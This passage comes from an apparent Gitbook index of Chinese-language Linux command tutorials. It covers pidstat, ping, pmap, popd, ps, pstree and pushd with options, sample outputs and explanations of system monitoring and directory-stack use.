Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时54分56秒 UID PID %usr %system %guest %CPU CPU Command 16时54分56秒 0 1 0.00 0.01 0.00 0.01 0 systemd 16时54分56秒 0 2 0.00 0.00 0.00 0.00 0 kthreadd 16时54分56秒 0 3 0.00 0.05 0.00 0.05 0 ksoftirqd/0 16时54分56秒 0 5 0.00 0.00 0.00 0.00 0 kworker/0:0H 16时54分56秒 0 7 0.00 0.01 0.00 0.01 0 migration/0 pidstat 和 pidstat -u -p ALL 是等效的。 pidstat 默认显示了所有进程的cpu使用率。 详细说明 PID：进程ID %usr：进程在用户空间占用cpu的百分比 %system：进程在内核空间占用cpu的百分比 %guest：进程在虚拟机占用cpu的百分比 %CPU：进程占用cpu的百分比 CPU：处理进程的cpu编号 Command：当前进程对应的命令 4.2 cpu使用情况统计(-u) [root@master ~]# pidstat -u Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时55分16秒 UID PID %usr %system %guest %CPU CPU Command 16时55分16秒 0 1 0.00 0.01 0.00 0.01 0 systemd 16时55分16秒 0 2 0.00 0.00 0.00 0.00 0 kthreadd 16时55分16秒 0 3 0.00 0.05 0.00 0.05 0 ksoftirqd/0 16时55分16秒 0 7 0.00 0.01 0.00 0.01 0 migration/0 16时55分16秒 0 9 0.00 0.25 0.00 0.25 1 rcu_sched 使用-u选项，pidstat将显示各活动进程的cpu使用统计，执行”pidstat -u”与单独执行”pidstat”的效果一样。 4.3 内存使用情况统计(-r) pidstat -r 使用-r选项，pidstat将显示各活动进程的内存使用统计： PID：进程标识符 Minflt/s:任务每秒发生的次要错误，不需要从磁盘中加载页 Majflt/s:任务每秒发生的主要错误，需要从磁盘中加载页 VSZ：虚拟地址大小，虚拟内存的使用KB RSS：常驻集合大小，非交换区五里内存使用KB Command：task命令名 4.4 显示各个进程的IO使用情况（-d） [root@master ~]# pidstat -d Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时56分08秒 UID PID kB_rd/s kB_wr/s kB_ccwr/s Command 16时56分08秒 0 1 4.79 0.06 0.02 systemd 16时56分08秒 0 3077 0.01 0.00 0.00 xfsaild/dm-0 16时56分08秒 0 3147 0.03 0.00 0.00 systemd-journal 16时56分08秒 0 3165 0.00 0.00 0.00 lvmetad 16时56分08秒 0 3180 0.37 0.00 0.00 systemd-udevd 报告IO统计显示以下信息： PID：进程id kB_rd/s：每秒从磁盘读取的KB kB_wr/s：每秒写入磁盘KB kB_ccwr/s：任务取消的写入磁盘的KB。当任务截断脏的pagecache的时候会发生。 COMMAND:task的命令名 4.5 显示每个进程的上下文切换情况（-w） [root@master ~]# pidstat -w -p 9903 Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时56分56秒 UID PID cswch/s nvcswch/s Command 16时56分56秒 0 9903 0.00 0.00 coredns PID:进程id Cswch/s:每秒主动任务上下文切换数量 Nvcswch/s:每秒被动任务上下文切换数量 Command:命令名 4.6 显示选择任务的线程的统计信息外的额外信息 (-t) [root@master ~]# pidstat -t -p 9903 Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时57分19秒 UID TGID TID %usr %system %guest %CPU CPU Command 16时57分19秒 0 9903 - 0.13 0.26 0.00 0.38 0 coredns 16时57分19秒 0 - 9903 0.00 0.00 0.00 0.00 0 |__coredns 16时57分19秒 0 - 10069 0.02 0.06 0.00 0.08 0 |__coredns 16时57分19秒 0 - 10070 0.02 0.03 0.00 0.05 0 |__coredns 16时57分19秒 0 - 10071 0.00 0.00 0.00 0.00 0 |__coredns 16时57分19秒 0 - 10088 0.01 0.02 0.00 0.02 1 |__coredns 16时57分19秒 0 - 10117 0.02 0.03 0.00 0.05 0 |__coredns 16时57分19秒 0 - 10123 0.00 0.00 0.00 0.00 0 |__coredns 16时57分19秒 0 - 10128 0.02 0.03 0.00 0.05 0 |__coredns 16时57分19秒 0 - 10143 0.02 0.03 0.00 0.05 1 |__coredns 16时57分19秒 0 - 13027 0.02 0.03 0.00 0.05 1 |__coredns 16时57分19秒 0 - 1555 0.01 0.02 0.00 0.03 1 |__coredns TGID:主线程的表示 TID:线程id %usr：进程在用户空间占用cpu的百分比 %system：进程在内核空间占用cpu的百分比 %guest：进程在虚拟机占用cpu的百分比 %CPU：进程占用cpu的百分比 CPU：处理进程的cpu编号 Command：当前进程对应的命令 4.7 pidstat -T [root@master ~]# pidstat -T TASK Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时57分44秒 UID PID %usr %system %guest %CPU CPU Command 16时57分44秒 0 1 0.00 0.01 0.00 0.01 1 systemd 16时57分44秒 0 2 0.00 0.00 0.00 0.00 0 kthreadd 16时57分44秒 0 3 0.00 0.05 0.00 0.05 0 ksoftirqd/0 16时57分44秒 0 7 0.00 0.01 0.00 0.01 0 migration/0 [root@master ~]# pidstat -T CHILD Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时58分14秒 UID PID usr-ms system-ms guest-ms Command 16时58分14秒 0 1 14480 22700 0 systemd 16时58分14秒 0 2 0 20 0 kthreadd 16时58分14秒 0 3 0 17880 0 ksoftirqd/0 16时58分14秒 0 7 0 2240 0 migration/0 16时58分14秒 0 9 0 89760 0 rcu_sched 16时58分14秒 0 11 0 690 0 watchdog/0 [root@master ~]# pidstat -T ALL Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时58分34秒 UID PID %usr %system %guest %CPU CPU Command 16时58分34秒 0 1 0.00 0.01 0.00 0.01 1 systemd 16时58分34秒 0 2 0.00 0.00 0.00 0.00 0 kthreadd 16时58分34秒 0 3 0.00 0.05 0.00 0.05 0 ksoftirqd/0 16时58分34秒 0 7 0.00 0.01 0.00 0.01 0 migration/0 TASK表示报告独立的task。 CHILD关键字表示报告进程下所有线程统计信息。 ALL表示报告独立的task和task下面的所有线程。 注意：task和子线程的全局的统计信息和pidstat选项无关。这些统计信息不会对应到当前的统计间隔，这些统计信息只有在子线程kill或者完成的时候才会被收集。 PID:进程id Usr-ms:任务和子线程在用户级别使用的毫秒数。 System-ms:任务和子线程在系统级别使用的毫秒数。 Guest-ms:任务和子线程在虚拟机(running a virtual processor)使用的毫秒数。 Command:命令名 4.8 指定采样周期和采样次数 pidstat命令指定采样周期和采样次数，命令形式为”pidstat [option] interval [count]”，以下pidstat输出以2秒为采样周期，输出3次cpu使用统计信息： [root@master ~]# pidstat 2 2 Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时59分16秒 UID PID %usr %system %guest %CPU CPU Command 16时59分18秒 0 9 0.00 0.50 0.00 0.50 0 rcu_sched 16时59分18秒 0 14 0.00 0.50 0.00 0.50 1 ksoftirqd/1 16时59分18秒 0 3147 0.50 0.50 0.00 1.00 0 systemd-journal 16时59分18秒 0 5173 0.50 1.00 0.00 1.49 0 kube-scheduler 16时59分18秒 0 6556 0.00 0.50 0.00 0.50 1 rsyslogd 16时59分18秒 0 6557 0.50 0.50 0.00 1.00 0 dockerd 16时59分18秒 0 7234 1.00 1.49 0.00 2.49 0 kubelet 16时59分18秒 0 9038 0.50 0.00 0.00 0.50 0 kube-proxy 16时59分18秒 0 9880 0.00 0.50 0.00 0.50 1 coredns 16时59分18秒 0 9903 0.00 0.50 0.00 0.50 0 coredns 16时59分18秒 0 18755 0.00 0.50 0.00 0.50 0 docker-containe 16时59分18秒 0 18772 0.00 0.50 0.00 0.50 0 etcd 16时59分18秒 0 19157 0.00 0.50 0.00 0.50 1 pidstat 16时59分18秒 UID PID %usr %system %guest %CPU CPU Command 16时59分20秒 0 9 0.00 0.50 0.00 0.50 0 rcu_sched 16时59分20秒 0 3077 0.00 0.50 0.00 0.50 0 xfsaild/dm-0 16时59分20秒 0 3147 0.00 0.50 0.00 0.50 1 systemd-journal 16时59分20秒 0 5173 0.50 0.50 0.00 1.00 0 kube-scheduler 16时59分20秒 0 6556 0.50 0.00 0.00 0.50 1 rsyslogd 16时59分20秒 0 6557 1.49 1.49 0.00 2.99 0 dockerd 16时59分20秒 0 6859 0.00 0.50 0.00 0.50 1 docker-containe 16时59分20秒 0 7234 4.48 4.48 0.00 8.96 0 kubelet 16时59分20秒 0 9038 0.00 0.50 0.00 0.50 0 kube-proxy 16时59分20秒 0 9880 0.00 1.00 0.00 1.00 1 coredns 16时59分20秒 0 9903 0.50 0.50 0.00 1.00 0 coredns 16时59分20秒 0 18772 0.50 0.50 0.00 1.00 0 etcd 16时59分20秒 0 19157 0.50 1.49 0.00 1.99 1 pidstat 平均时间: UID PID %usr %system %guest %CPU CPU Command 平均时间: 0 9 0.00 0.50 0.00 0.50 - rcu_sched 平均时间: 0 14 0.00 0.25 0.00 0.25 - ksoftirqd/1 平均时间: 0 3077 0.00 0.25 0.00 0.25 - xfsaild/dm-0 平均时间: 0 3147 0.25 0.50 0.00 0.75 - systemd-journal 平均时间: 0 5173 0.50 0.75 0.00 1.24 - kube-scheduler 平均时间: 0 6556 0.25 0.25 0.00 0.50 - rsyslogd 平均时间: 0 6557 1.00 1.00 0.00 1.99 - dockerd 平均时间: 0 6859 0.00 0.25 0.00 0.25 - docker-containe 平均时间: 0 7234 2.74 2.99 0.00 5.72 - kubelet 平均时间: 0 9038 0.25 0.25 0.00 0.50 - kube-proxy 平均时间: 0 9880 0.00 0.75 0.00 0.75 - coredns 平均时间: 0 9903 0.25 0.50 0.00 0.75 - coredns 平均时间: 0 18755 0.00 0.25 0.00 0.25 - docker-containe 平均时间: 0 18772 0.25 0.50 0.00 0.75 - etcd 平均时间: 0 19157 0.25 1.00 0.00 1.24 - pidstat pidstat常用命令 使用pidstat进行问题定位时，以下命令常被用到： pidstat -u 1 pidstat -r 1 pidstat -d 1 以上命令以1秒为信息采集周期，分别获取cpu、内存和磁盘IO的统计信息。 参考： pidstat(1) — Linux manual page pidstat Command Examples in Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:24:22 "},"Linux-Command/Linux_Command_ping.html":{"url":"Linux-Command/Linux_Command_ping.html","title":"Linux Command Ping","keywords":"","body":"Linux Command pingLinux Command ping tagsstart 网络 tagsstop ping 是个使用频率极高的实用程序，主要用于确定网络的连通性。这对确定网络是否正确连接，以及网络连接的状况十分有用。简单的说，ping 就是一个测试程序，如果 ping 运行正确，大体上就可以排除网络访问层、网卡、Modem 的输入输出线路、电缆和路由器等存在的故障，从而缩小问题的范围。 ping 能够以毫秒为单位显示发送请求到返回应答之间的时间量。如果应答时间短，表示数据报不必通过太多的路由器或网络，连接速度比较快。ping 还能显示 TTL（Time To Live，生存时间）值，通过 TTL 值可以推算数据包通过了多少个路由器。 命令格式 ping 主机名 ping 域名 ping IP 地址 图 1.2.54.1：在这里插入图片描述 如图所示，使用 ping 命令检查到 IP 地址 210.43.16.17 的计算机的连通性，该例为连接正常。共发送了四个测试数据包，正确接收到四个数据包。 ping 命令的基本应用 一般情况下，用户可以通过使用一系列 ping 命令来查找问题出在什么地方，或检验网络运行的情况。 下面就给出一个典型的检测次序及对应的可能故障： ① ping 127.0.0.1 如果测试成功，表明网卡、TCP/IP 协议的安装、IP 地址、子网掩码的设置正常。如果测试不成功，就表示 TCP/IP 的安装或设置存在有问题。 ② ping 本机 IP 地址 如果测试不成功，则表示本地配置或安装存在问题，应当对网络设备和通讯介质进行测试、检查并排除。 ③ ping 局域网内其他 IP 如果测试成功，表明本地网络中的网卡和载体运行正确。但如果收到 0 个回送应答，那么表示子网掩码不正确或网卡配置错误或电缆系统有问题。 ④ ping 网关 IP 这个命令如果应答正确，表示局域网中的网关路由器正在运行并能够做出应答。 ⑤ ping 远程 IP 如果收到正确应答，表示成功的使用了缺省网关。对于拨号上网用户则表示能够成功的访问 Internet（但不排除 ISP 的 DNS 会有问题）。 ⑥ ping localhost local host 是系统的网络保留名，它是 127.0.0.1 的别名，每台计算机都应该能够将该名字转换成该地址。否则，则表示主机文件（/Windows/host）中存在问题。 ⑦ ping www.yahoo.com（一个著名网站域名） 对此域名执行 Ping 命令，计算机必须先将域名转换成 IP 地址，通常是通过 DNS 服务器。如果这里出现故障，则表示本机 DNS 服务器的 IP 地址配置不正确，或它所访问的 DNS 服务器有故障 如果上面所列出的所有 ping 命令都能正常运行，那么计算机进行本地和远程通信基本上就没有问题了。但是，这些命令的成功并不表示你所有的网络配置都没有问题，例如，某些子网掩码错误就可能无法用这些方法检测到。 linux下ping包的默认大小为64Byte，次数不限。但有时我们需要尝试ping大数据包，来测试网络的状况，这时，就要指定ping包的大小了。 Linux下ping大数据包的格式; 语 法：ping [-dfnqrRv][-c][-i][-I][-l][-p][-s][-t][主机名称或IP地址] ping IP -t：连续对 IP 地址执行 ping 命令，直到被用户以 Ctrl+C 中断。 例如： 指定数据包大小为1500Byte：ping -s 1500 ip 指定次数为4次，数据包大小为32767Byte：ping -c 4 -s 32767 ip Windows下默认ping包次数为4次，ping包大小为32Byte： 指定ping包大小为1500Byte：ping -l 1500 ip 指定次数为6次，ping包大小为1500：ping -n 6 -l 1500 ip 注意：随着防火墙功能在网络中的广泛使用，当你 ping 其他主机或其他主机 ping 你的主机时，而显示主机不可达的时候，不要草率地下结论。最好与对某台 “设置良好” 主机的 ping 结果进行对比。 参考： PING Command in Linux with examples Linux Ping Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 15:01:57 "},"Linux-Command/Linux_Command_pmap.html":{"url":"Linux-Command/Linux_Command_pmap.html","title":"Linux Command Pmap","keywords":"","body":"Linux Command pmap 测试进程内存映射工具1. 简介2. 语法3. 参数4. 实例4.1 查看进程1设备格式4.2 查看进程1设备格式不显示头尾行4.3 查看进程1扩展格式4.4 循环显示进程3066设备格式最后1行Linux Command pmap 测试进程内存映射工具 tagsstart 监控 tagsstop 1. 简介 pmap命令用于报告进程的内存映射关系，是Linux调试及运维一个很好的工具。 2. 语法 pmap [ -x | -d ] [ -q ] pids... pmap -V 3. 参数 -x extended Show the extended format. 显示扩展格式 -d device Show the device format. 显示设备格式 -q quiet Do not display some header/footer lines. 不显示头尾行 -V show version Displays version of program. 显示版本 扩展格式和设备格式域： Address: start address of map 映像起始地址 Kbytes: size of map in kilobytes 映像大小 RSS: resident set size in kilobytes 驻留集大小 Dirty: dirty pages (both shared and private) in kilobytes 脏页大小 Mode: permissions on map 映像权限: r=read, w=write, x=execute, s=shared, p=private (copy on write) Mapping: file backing the map , or '[ anon ]' for allocated memory, or '[ stack ]' for the program stack. 映像支持文件,[anon]为已分配内存 [stack]为程序堆栈 Offset: offset into the file 文件偏移 Device: device name (major:minor) 设备名 4. 实例 4.1 查看进程1设备格式 [root@C44 ~]# pmap -d 1 1: init [5] Address Kbytes Mode Offset Device Mapping 00934000 88 r-x-- 0000000000000000 008:00005 ld-2.3.4.so 0094a000 4 r---- 0000000000015000 008:00005 ld-2.3.4.so 0094b000 4 rw--- 0000000000016000 008:00005 ld-2.3.4.so 0094e000 1188 r-x-- 0000000000000000 008:00005 libc-2.3.4.so 00a77000 8 r---- 0000000000129000 008:00005 libc-2.3.4.so 00a79000 8 rw--- 000000000012b000 008:00005 libc-2.3.4.so 00a7b000 8 rw--- 0000000000a7b000 000:00000 [ anon ] 00a85000 52 r-x-- 0000000000000000 008:00005 libsepol.so.1 00a92000 4 rw--- 000000000000c000 008:00005 libsepol.so.1 00a93000 32 rw--- 0000000000a93000 000:00000 [ anon ] 00d9d000 52 r-x-- 0000000000000000 008:00005 libselinux.so.1 00daa000 4 rw--- 000000000000d000 008:00005 libselinux.so.1 08048000 28 r-x-- 0000000000000000 008:00005 init 0804f000 4 rw--- 0000000000007000 008:00005 init 084e1000 132 rw--- 00000000084e1000 000:00000 [ anon ] b7f5d000 8 rw--- 00000000b7f5d000 000:00000 [ anon ] bffee000 72 rw--- 00000000bffee000 000:00000 [ stack ] ffffe000 4 ----- 0000000000000000 000:00000 [ anon ] mapped: 1700K writeable/private: 276K shared: 0K 最后一行的值 mapped 表示该进程映射的虚拟地址空间大小，也就是该进程预先分配的虚拟内存大小，即ps出的vsz writeable/private 表示进程所占用的私有地址空间大小，也就是该进程实际使用的内存大小 shared 表示进程和其他进程共享的内存大小 4.2 查看进程1设备格式不显示头尾行 [root@C44 ~]# pmap -d -q 1 1: init [5] 00934000 88 r-x-- 0000000000000000 008:00005 ld-2.3.4.so 0094a000 4 r---- 0000000000015000 008:00005 ld-2.3.4.so 0094b000 4 rw--- 0000000000016000 008:00005 ld-2.3.4.so 0094e000 1188 r-x-- 0000000000000000 008:00005 libc-2.3.4.so 00a77000 8 r---- 0000000000129000 008:00005 libc-2.3.4.so 00a79000 8 rw--- 000000000012b000 008:00005 libc-2.3.4.so 00a7b000 8 rw--- 0000000000a7b000 000:00000 [ anon ] 00a85000 52 r-x-- 0000000000000000 008:00005 libsepol.so.1 00a92000 4 rw--- 000000000000c000 008:00005 libsepol.so.1 00a93000 32 rw--- 0000000000a93000 000:00000 [ anon ] 00d9d000 52 r-x-- 0000000000000000 008:00005 libselinux.so.1 00daa000 4 rw--- 000000000000d000 008:00005 libselinux.so.1 08048000 28 r-x-- 0000000000000000 008:00005 init 0804f000 4 rw--- 0000000000007000 008:00005 init 084e1000 132 rw--- 00000000084e1000 000:00000 [ anon ] b7f5d000 8 rw--- 00000000b7f5d000 000:00000 [ anon ] bffee000 72 rw--- 00000000bffee000 000:00000 [ stack ] ffffe000 4 ----- 0000000000000000 000:00000 [ anon ] 4.3 查看进程1扩展格式 [root@C44 ~]# pmap -x 1 1: init [5] Address Kbytes RSS Anon Locked Mode Mapping 00934000 88 - - - r-x-- ld-2.3.4.so 0094a000 4 - - - r---- ld-2.3.4.so 0094b000 4 - - - rw--- ld-2.3.4.so 0094e000 1188 - - - r-x-- libc-2.3.4.so 00a77000 8 - - - r---- libc-2.3.4.so 00a79000 8 - - - rw--- libc-2.3.4.so 00a7b000 8 - - - rw--- [ anon ] 00a85000 52 - - - r-x-- libsepol.so.1 00a92000 4 - - - rw--- libsepol.so.1 00a93000 32 - - - rw--- [ anon ] 00d9d000 52 - - - r-x-- libselinux.so.1 00daa000 4 - - - rw--- libselinux.so.1 08048000 28 - - - r-x-- init 0804f000 4 - - - rw--- init 084e1000 132 - - - rw--- [ anon ] b7f5d000 8 - - - rw--- [ anon ] bffee000 72 - - - rw--- [ stack ] ffffe000 4 - - - ----- [ anon ] -------- ------- ------- ------- ------- total kB 1700 - - - 4.4 循环显示进程3066设备格式最后1行 间隔2秒 [root@C44 ~]# while true; do pmap -d 3066 | tail -1; sleep 2; done mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K mapped: 5412K writeable/private: 2028K shared: 0K 更多阅读： pmap command in Linux with Examples Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:29:54 "},"Linux-Command/Linux_Command_popd.html":{"url":"Linux-Command/Linux_Command_popd.html","title":"Linux Command Popd","keywords":"","body":"Linux Command popd1. 简介2. 语法3. 参数4. 实例Linux Command popd tagsstart 文件管理 tagsstop 1. 简介 popd命令用于从目录堆栈中删除目录。popd 中的“d”代表目录，因为它将目录路径删除到堆栈中。执行此命令后，当前目录堆栈显示为以空格分隔的目录列表。在每个 popd命令之后，目录堆栈的大小都会减小。此目录堆栈基于后进先出 (LIFO) 原则。 2. 语法 popd [OPTIONS] [DIRECTORY] 3. 参数 +N：将第N个目录删除（从左边数起，数字从0开始）； -N：将第N个目录删除（从右边数起，数字从0开始）； -n：将目录出栈时，不切换目录。 4. 实例 root@Mylinux:/tmp/dir4# popd（相当于popd +0） /tmp/dir3 /tmp/dir2 /tmp/dir1 ~ root@Mylinux:/tmp/dir3# pushd /tmp/dir4 /tmp/dir4 /tmp/dir3 /tmp/dir2 /tmp/dir1 ~ root@Mylinux:/tmp/dir4# popd +1 /tmp/dir4 /tmp/dir2 /tmp/dir1 ~ root@Mylinux:/tmp/dir4# popd -2 /tmp/dir4 /tmp/dir1 ~ Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:32:39 "},"Linux-Command/Linux_Command_ps.html":{"url":"Linux-Command/Linux_Command_ps.html","title":"Linux Command Ps","keywords":"","body":"Linux Command ps 性能分析1. 简介2. 参数3. 输出说明4. 实例4.1 ps 不带任何选项4.2 a、u、x组合4.3 分层视图中显示正在运行的进程4.4 按用户过滤进程列表4.5 其他选项Linux Command ps 性能分析 tagsstart 分析 tagsstop 图 1.2.57.1：在这里插入图片描述 1. 简介 ps 为我们提供了进程的一次性的查看，它所提供的查看结果并不动态连续的；如果想对进程时间监控，应该用 top 工具。 2. 参数 ps a 显示现行终端机下的所有程序，包括其他用户的程序。 ps -A 显示所有进程。 ps c 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。 ps -e 此参数的效果和指定\"A\"参数相同。 ps e 列出程序时，显示每个程序所使用的环境变量。 ps f 用ASCII字符显示树状结构，表达程序间的相互关系。 ps -H 显示树状结构，表示程序间的相互关系。 ps j 用任务格式来显示进程； ps l 长格式输出； ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。 ps r 显示运行中的进程； ps s 采用程序信号的格式显示程序状况。 ps S 列出程序时，包括已中断的子程序资料。 ps -t 　指定终端机编号，并列出属于该终端机的程序的状况。 ps u 　按用户名和启动时间的顺序来显示进程。 ps x 　显示无控制终端的进程。 ps ww 避免详细参数被截断； 最常用的方法是ps -aux,然后再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作。 我们常用的选项是组合是 aux 或 lax，还有参数 f 的应用。 3. 输出说明 运行 ps aux 的到如下信息： $ ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND smmsp 3521 0.0 0.7 6556 1616 ? Ss 20:40 0:00 sendmail: Queue runner@01:00:00 f root 3532 0.0 0.2 2428 452 ? Ss 20:40 0:00 gpm -m /dev/input/mice -t imps2 htt 3563 0.0 0.0 2956 196 ? Ss 20:41 0:00 /usr/sbin/htt -retryonerror 0 htt 3564 0.0 1.7 29460 3704 ? Sl 20:41 0:00 htt_server -nodaemon root 3574 0.0 0.4 5236 992 ? Ss 20:41 0:00 crond xfs 3617 0.0 1.3 13572 2804 ? Ss 20:41 0:00 xfs -droppriv -daemon root 3627 0.0 0.2 3448 552 ? SNs 20:41 0:00 anacron -s root 3636 0.0 0.1 2304 420 ? Ss 20:41 0:00 /usr/sbin/atd dbus 3655 0.0 0.5 13840 1084 ? Ssl 20:41 0:00 dbus-daemon-1 --system Head标头： USER 用户名 UID 用户ID（User ID） PID 进程ID（Process ID） PPID 父进程的进程ID（Parent Process id） SID 会话ID（Session id） %CPU 进程的cpu占用率 %MEM 进程的内存占用率 VSZ 进程所使用的虚存的大小（Virtual Size） RSS 进程使用的驻留集大小或者是实际内存的大小，Kbytes字节。 TTY 与进程关联的终端（tty） STAT 进程的状态：进程状态使用字符表示的（STAT的状态码） R 运行 Runnable (on run queue) 正在运行或在运行队列中等待。 S 睡眠 Sleeping 休眠中, 受阻, 在等待某个条件的形成或接受到信号。 I 空闲 Idle Z 僵死 Zombie（a defunct process) 进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放。 D 不可中断 Uninterruptible sleep (ususally IO) 收到信号不唤醒和不可运行, 进程必须等待直到有中断发生。 T 终止 Terminate 进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行。 P 等待交换页 W 无驻留页 has no resident pages 没有足够的记忆体分页可分配。 X 死掉的进程 4. 实例 4.1 ps 不带任何选项 图 1.2.57.2：在这里插入图片描述 默认输出包括以下类别： PID：进程标识号。 TTY：进程运行的终端类型。 TIME : CPU 使用总量。 CMD：启动进程的命令的名称。 4.2 a、u、x组合 图 1.2.57.3：a产生u更x详细的输出 扩展输出的新类别包括： USER：运行进程的用户名。 %CPU：CPU 使用百分比。 %MEM：内存使用百分比。 VSZ：进程使用的总虚拟内存，以千字节为单位。 RSS：驻留集大小，进程占用的 RAM 部分。 STAT：当前进程状态。 START：进程开始的时间。 4.3 分层视图中显示正在运行的进程 ps -axjf 图 1.2.57.4：在这里插入图片描述 4.4 按用户过滤进程列表 ps -U [real user ID or name] -u [effective user ID or name] u 例如，显示由名为phoenixnap的用户启动的进程列表： ps -U phoenixnap -u phoenixnap u 图 1.2.57.5：在这里插入图片描述 4.5 其他选项 查看当前系统进程的uid,pid,stat,pri, 以uid号排序. ps -eo pid,stat,pri,uid –sort uid 查看当前系统进程的user,pid,stat,rss,args, 以rss排序. ps -eo user,pid,stat,rss,args –sort rss 查看所有进程详细展示 ps axHww -o psr,user,pid,ppid,tid,tty,stat,%cpu,%mem,rss,vsz,wchan,args 查看已经停止的进程 ps -A -ostat,ppid,pid,cmd | grep -e '^[T]' 参考： ps(1) — Linux manual page ps command in Linux with Examples The Linux “ps” Command Examples How to Use the ps Command on Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-10-16 07:14:05 "},"Linux-Command/Linux_Command_pstree.html":{"url":"Linux-Command/Linux_Command_pstree.html","title":"Linux Command Pstree","keywords":"","body":"Linux Command pstree 显示进程树状图1. 简介2. 参数3. 示例3.1 显示当前所有进程的进程号和进程id3.2 显示所有进程的所有详细信息3.3 特别表明在运行的进程3.4 查看某一个进程的树状图3.5 获取 SSH 会话的 PIDLinux Command pstree 显示进程树状图 tagsstart 监控 tagsstop 1. 简介 pstree命令 以树状图的方式展现进程之间的派生关系，显示效果比较直观。 2. 参数 -a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示； -c：不使用精简标示法； -G：使用VT100终端机的列绘图字符； -h：列出树状图时，特别标明现在执行的程序； -H：此参数的效果和指定\"-h\"参数类似，但特别标明指定的程序； -l：采用长列格式显示树状图； -n：用程序识别码排序。预设是以程序名称来排序； -p：显示程序识别码； -u：显示用户名称； -U：使用UTF-8列绘图字符； -V：显示版本信息。 -t: 显示线程 3. 示例 3.1 显示当前所有进程的进程号和进程id pstree -p 3.2 显示所有进程的所有详细信息 遇到相同的进程名可以压缩显示。 pstree -a 3.3 特别表明在运行的进程 # pstree -apnh //显示进程间的关系 systemd,1 auto automatic-ubiquity noprompt ├─systemd-journal,471 ├─lvmetad,488 -f ├─systemd-udevd,492 ├─systemd-timesyn,675 │ └─{systemd-timesyn},702 ├─VGAuthService,745 ├─vmtoolsd,746 │ ├─{vmtoolsd},762 │ └─{vmtoolsd},775 ├─systemd-network,826 ├─systemd-resolve,838 ├─rsyslogd,902 -n │ ├─{rsyslogd},910 │ ├─{rsyslogd},911 │ └─{rsyslogd},912 3.4 查看某一个进程的树状图 # -t表示显示线程，-a表示显示命令行参数 $ pstree -t -a -p 27458 mysqld,27458 --log_bin=on --sync_binlog=1 ... ├─{mysqld},27922 ├─{mysqld},27923 └─{mysqld},28014 3.5 获取 SSH 会话的 PID pstree -p | grep ssh # |-sshd(1221)-+-sshd(2768)---bash(2770)-+-grep(2810) # | `-sshd(2807)---sshd(2808) 从上方的输出中，你可以看到 sshd 进程与分支的树形图。sshd 的主进程是 sshd（1221），另两个分支分别为 sshd（2768） 和 sshd（2807）。 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 16:57:37 "},"Linux-Command/Linux_Command_pushd.html":{"url":"Linux-Command/Linux_Command_pushd.html","title":"Linux Command Pushd","keywords":"","body":"Linux Command pushd1. 简介2. 格式3. 参数4. 实例Linux Command pushd tagsstart 文件管理 tagsstop 1. 简介 pushed命令用于将目录加入堆栈中，加入记录到目录栈顶部，并切换到该目录，如果不加任何参数， 则会将位于记录栈最上面的两个目录对换位置。 2. 格式 pushed [参数] [目录] 3. 参数 -n 将右起第n个目录移到堆栈顶（n从0开始计数） +n 将左起第n个目录移到堆栈顶（n从0开始计数） 4. 实例 显示Shell默认的目录堆栈： [root@linuxcool ~]# dirs /var/log 向Shell目录堆栈中添加目录/etc： [root@linuxcool ~]# pushed /etc 显示Shell目录堆栈内容，每行一个记录，并加序号： [root@linuxcool ~]# dirs -v 0 /sbin 1 /etc 2 /var/log 将第一个记录移到堆栈顶： [root@linuxcool ~]# pushed -1 /etc /var/log /sbin 要禁止默认更改目录，请使用-n选项，例如，要将/usr/local目录添加到堆栈但不更改到堆栈 [root@linuxcool ~]# pushd -n /usr/local /etc /usr/local /var/log /sbin 从上到下（或从左到右）计数时，目录的索引为2：相当于cd pushd +2 从下到上计数时，/var/www目录的索引为1： pushd -1. 更多阅读： pushd Command in Linux with Examples Pushd and Popd Commands in Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:47:57 "},"Linux-Command/Linux_Command_read.html":{"url":"Linux-Command/Linux_Command_read.html","title":"Linux Command Read","keywords":"","body":"Linux Command read1. 用法2. 参数2.1 -t 